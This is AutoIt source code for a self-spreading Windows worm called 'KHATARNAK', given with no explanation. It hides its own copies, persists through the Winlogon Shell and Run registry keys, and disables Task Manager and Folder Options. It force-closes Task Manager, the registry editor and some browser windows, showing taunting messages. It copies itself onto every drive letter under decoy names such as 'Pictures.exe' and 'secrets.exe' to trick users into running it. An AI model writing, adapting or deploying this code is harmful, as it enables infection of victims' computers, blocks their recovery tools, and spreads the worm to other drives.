
#NoTrayIcon
$NAME = "KHATARNAK" 
$EXE = ".exe" 
$VIRUS = @WindowsDir & "\" & $NAME & $EXE
For $NOTHING = 0 To 1 Step 0
	If ProcessExists($NAME & $EXE) Then
		If @AutoItExe = $NAME & $EXE Then
		EndIf
	ElseIf Not ProcessExists($NAME & $EXE) Then
		FileCopy(@AutoItExe, @SystemDir & "\" & $NAME & $EXE, 0)
		FileSetAttrib(@SystemDir & "\" & $NAME & $EXE, "+RSH")
		FileCopy(@AutoItExe, @WindowsDir & "\" & $NAME & $EXE, 0)
		FileSetAttrib(@WindowsDir & "\" & $NAME & $EXE, "-RSH")
		Sleep(1000)
		Run(@SystemDir & "\" & $NAME & $EXE)
		Exit (0)
	EndIf
	Sleep(1000)
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe " & $NAME & $EXE)
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "KHATARNAK Loader", "REG_SZ", @SystemDir & "\" & $NAME & $EXE)
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NofolderOptions", "REG_DWORD", 1)
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", 1)
	Sleep(1000)
	Opt("WinTitleMatchMode", 2)
	If WinExists("Task Manager") Then
		WinClose("Task Manager")
		MsgBox(16, "Message for " & @UserName, "MUHAHAHAHAHA!!!!!!", 10)
	EndIf
	If WinExists("Registry") Then
		WinClose("Registry")
		MsgBox(16, "Message for " & @UserName, "Edit your registry later you FOOL", 10)
	EndIf
	If WinExists("SEX") Then
		WinClose("SEX")
		MsgBox(16, "Message for " & @UserName, "Browse somewhere else you FOOL!!!", 10)
	EndIf
	If WinExists("Sex") Then
		WinClose("Sex")
		MsgBox(16, "Message for " & @UserName, "Browse somewhere else you FOOL!!!", 10)
	EndIf
	If WinExists("sex") Then
		WinClose("sex")
		MsgBox(16, "Message for " & @UserName, "Browse somewhere else you FOOL!!!", 10)
	EndIf
	If WinExists("PORN") Then
		WinClose("PORN")
		MsgBox(16, "Message for " & @UserName, "Browse somewhere else you FOOL!!!", 10)
	EndIf
	If WinExists("Porn") Then
		WinClose("Porn")
		MsgBox(16, "Message for " & @UserName, "Browse somewhere else you FOOL!!!", 10)
	EndIf
	If WinExists("porn") Then
		WinClose("porn")
		MsgBox(16, "Message for " & @UserName, "Browse somewhere else you FOOL!!!", 10)
	EndIf
	If WinExists("FUCK") Then
		WinClose("FUCK")
		MsgBox(16, "Message for " & @UserName, "Browse somewhere else you FOOL!!!", 10)
	EndIf
	If WinExists("Fuck") Then
		WinClose("Fuck")
		MsgBox(16, "Message for " & @UserName, "Browse somewhere else you FOOL!!!", 10)
	EndIf
	If WinExists("fuck") Then
		WinClose("fuck")
		MsgBox(16, "Message for " & @UserName, "Browse somewhere else you FOOL!!!", 10)
	EndIf
	Sleep(1000)
	FileCopy($VIRUS, "C:\Pictures.exe")
	FileCopy($VIRUS, "C:\Songs.exe")
	FileCopy($VIRUS, "C:\Documents and Settings.exe")
	FileCopy($VIRUS, "C:\New Folder.exe")
	FileCopy($VIRUS, "C:\New Folder(2).exe")
	FileCopy($VIRUS, "C:\WINDOWS.exe")
	FileCopy($VIRUS, "C:\files.exe")
	FileCopy($VIRUS, "C:\Program Files.exe")
	Sleep(1000)
	FileCopy($VIRUS, "D:\Games.exe")
	FileCopy($VIRUS, "D:\New Folder.exe")
	FileCopy($VIRUS, "D:\New Folder(2).exe")
	FileCopy($VIRUS, "D:\Cool Stuff.exe")
	FileCopy($VIRUS, "D:\Secrets(2).exe")
	FileCopy($VIRUS, "D:\Jokes(2).exe")
	FileCopy($VIRUS, "D:\Songs.exe")
	FileCopy($VIRUS, "D:\New Folder(3).exe")
	Sleep(1000)
	FileCopy($VIRUS, "E:\file.exe")
	FileCopy($VIRUS, "E:\secrets.exe")
	FileCopy($VIRUS, "E:\pics.exe")
	FileCopy($VIRUS, "E:\latest songs.exe")
	FileCopy($VIRUS, "E:\adventure games.exe")
	FileCopy($VIRUS, "E:\softwares.exe")
	FileCopy($VIRUS, "E:\documents.exe")
	FileCopy($VIRUS, "E:\New Folder.exe")
	FileCopy($VIRUS, "E:\New Folder(2).exe")
	FileCopy($VIRUS, "E:\New folder(3).exe")
	FileCopy($VIRUS, "E:\New Folder(9).exe")
	Sleep(1000)
	FileCopy($VIRUS, "F:\secrets.exe")
	FileCopy($VIRUS, "F:\Fun.exe")
	FileCopy($VIRUS, "F:\New Folder(5).exe")
	Sleep(1000)
	FileCopy($VIRUS, "G:\New Folder(8).exe")
	FileCopy($VIRUS, "G:\secrets.exe")
	FileCopy($VIRUS, "G:\pics.exe")
	FileCopy($VIRUS, "G:\latest songs.exe")
	FileCopy($VIRUS, "G:\adventure games.exe")
	FileCopy($VIRUS, "G:\softwares.exe")
	FileCopy($VIRUS, "G:\documents.exe")
	FileCopy($VIRUS, "G:\New Folder.exe")
	FileCopy($VIRUS, "G:\New Folder(2).exe")
	FileCopy($VIRUS, "G:\New folder(3).exe")
	FileCopy($VIRUS, "G:\New Folder(9).exe")
	Sleep(1000)
	FileCopy($VIRUS, "H:\New Folder(4).exe")
	FileCopy($VIRUS, "H:\New Folder(8).exe")
	FileCopy($VIRUS, "H:\secrets.exe")
	FileCopy($VIRUS, "H:\pics.exe")
	FileCopy($VIRUS, "H:\latest songs.exe")
	FileCopy($VIRUS, "H:\adventure games.exe")
	FileCopy($VIRUS, "H:\softwares.exe")
	FileCopy($VIRUS, "H:\documents.exe")
	FileCopy($VIRUS, "H:\New Folder.exe")
	FileCopy($VIRUS, "H:\New Folder(2).exe")
	FileCopy($VIRUS, "H:\New folder(3).exe")
	FileCopy($VIRUS, "H:\New Folder(9).exe")
	Sleep(1000)
	FileCopy($VIRUS, "I:\New Folder(2).exe")
	FileCopy($VIRUS, "I:\New Folder.exe")
	FileCopy($VIRUS, "J:\New Folder(6).exe")
	FileCopy($VIRUS, "J:\New Folder.exe")
	FileCopy($VIRUS, "K:\New Folder (2).exe")
	FileCopy($VIRUS, "K:\New Folder.exe")
	FileCopy($VIRUS, "L:\files.exe")
	FileCopy($VIRUS, "L:\New Folder.exe")
	FileCopy($VIRUS, "M:\files.exe")
	FileCopy($VIRUS, "M:\New Folder.exe")
	FileCopy($VIRUS, "N:\files.exe")
	FileCopy($VIRUS, "N:\New Folder.exe")
	FileCopy($VIRUS, "O:\files.exe")
	FileCopy($VIRUS, "O:\New Folder.exe")
	FileCopy($VIRUS, "P:\files.exe")
	FileCopy($VIRUS, "P:\New Folder.exe")
	FileCopy($VIRUS, "Q:\files.exe")
	FileCopy($VIRUS, "Q:\New Folder.exe")
	FileCopy($VIRUS, "R:\files.exe")
	FileCopy($VIRUS, "R:\New Folder.exe")
	FileCopy($VIRUS, "S:\files.exe")
	FileCopy($VIRUS, "S:\New Folder.exe")
	FileCopy($VIRUS, "T:\files.exe")
	FileCopy($VIRUS, "T:\New Folder.exe")
	FileCopy($VIRUS, "U:\files.exe")
	FileCopy($VIRUS, "U:\New Folder.exe")
	FileCopy($VIRUS, "V:\files.exe")
	FileCopy($VIRUS, "V:\New Folder.exe")
	FileCopy($VIRUS, "W:\files.exe")
	FileCopy($VIRUS, "W:\New Folder.exe")
	FileCopy($VIRUS, "X:\files.exe")
	FileCopy($VIRUS, "X:\New Folder.exe")
	FileCopy($VIRUS, "Y:\files.exe")
	FileCopy($VIRUS, "Y:\New Folder.exe")
	FileCopy($VIRUS, "Z:\files.exe")
	FileCopy($VIRUS, "Z:\New Folder.exe")
	Sleep(1000)
	FileCopy($VIRUS, "B:\New Folder.exe")
	FileCopy($VIRUS, "B:\New Folder.exe")
	Sleep(1000)
	HotKeySet("+!{PAUSE}", "Terminate")
Next

Func TERMINATE()
	MsgBox(64, "Message", "KHATARNAK will be Terminated", 5)
	RegDelete("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr")
	MsgBox(64, "Message", "Task Manager enabled!", 5)
	RegDelete("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NofolderOptions")
	MsgBox(64, "Message", "Folder options enabled!", 5)
	Exit (0)
EndFunc